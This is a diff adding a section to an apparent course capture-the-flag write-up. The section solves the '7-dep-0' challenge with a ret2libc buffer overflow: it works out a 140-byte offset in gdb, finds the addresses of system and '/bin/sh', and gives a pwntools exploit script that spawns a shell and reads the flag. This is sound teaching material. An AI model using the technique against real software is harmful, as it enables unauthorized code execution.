@@ -310,3 +310,103 @@ Reading shellcode from shellcode.bin
 $ cat flag
 CS6332{n0_puSh_bUt_CLTD}
 ```
+
+## 7-dep-0
+
+The problem statement is below.
+
+```md
+NO system() but you will call system() on this system...
+```
+
+Use gdb to analyze the binary.
+
+In the `input_func`, there is a syscall of `read`.
+
+```x86asm
+ 8048548:	e8 43 fe ff ff       	call   8048390 <read@plt>
+```
+
+We can see it as below in gdb, so `0xffffd190` may be used as buffer overflow.
+
+```gdb
+ ► 0x8048548 <input_func+37>    calll  read@plt <read@plt>
+        fd: 0x0
+        buf: 0xffffd190 —▸ 0xf7fe2a70 (_dl_lookup_symbol_x+16) ◂— addl   $0x1a590, %edi
+        nbytes: 0x100
+```
+
+Use `info frame` to check saved registers.
+
+```gdb
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> info frame
+Stack level 0, frame at 0xffffd220:
+ eip = 0x804855c in input_func; saved eip = 0x8048579
+ called by frame at 0xffffd250
+ Arglist at 0xffffd218, args: 
+ Locals at 0xffffd218, Previous frame's sp is 0xffffd220
+ Saved registers:
+  ebx at 0xffffd214, ebp at 0xffffd218, eip at 0xffffd21c
+```
+
+`eip` should be return address. How many bytes do we need to pad to use it?
+
+`0xffffd21c`(`eip`) - `0xffffd190`(`buf`) = 140(bytes)
+
+We know 140 bytes are needed to make its buffer overflow.
+
+```gdb
+pwndbg> 
+Please type your name: 
+00000000111111112222222233333333444444445555555566666666777777778888888899999999000000001111111122222222333333334444444455555555666666667777111
+```
+
+After the buffer overflow, we successfully make the code to call system and exit.
+
+```gdb
+pwndbg> p system
+$1 = {<text variable, no debug info>} 0xf7e3adb0 <__libc_system>
+```
+
+Using the `system` address, next we get `/bin/sh` address.
+
+```gdb
+pwndbg> find 0xf7e3adb0, +99999999,"/bin/sh"
+0xf7f5bb2b
+warning: Unable to access 16000 bytes of target memory at 0xf7fb58b3, halting search.
+1 pattern found.
+```
+
+We got the shell address.
+
+In summary, we have system call address, `0xf7e3adb0` and shell address, `0xf7f5bb2b`.
+
+Use them to get the address.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+from pwn import context, gdb, p32, process
+
+context.terminal = ["tmux", "splitw", "-h"]
+# context.log_level = "DEBUG"
+
+io = process(["./7-dep-0"])
+io.recv()
+payload = b"a" * 140 + p32(0xF7E3ADB0) + b"ABCD" + p32(0xF7F5BB2B)
+io.sendline(payload)
+io.interactive()
+```
+
+After the execution, we get the flag.
+
+```bash
+TXK220008@ctf-vm1:~/unit2/7-dep-0$ ./solve7.py 
+[+] Starting local process './7-dep-0': pid 20760
+[*] Switching to interactive mode
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0\xad\xe3\xf7ABCD+\xbb\xf5\xf7
+\xd2\xff\xff\x10\xed\xf7&N!
+$ cat flag
+CS6332{l1bc_sy5t3M}
+```
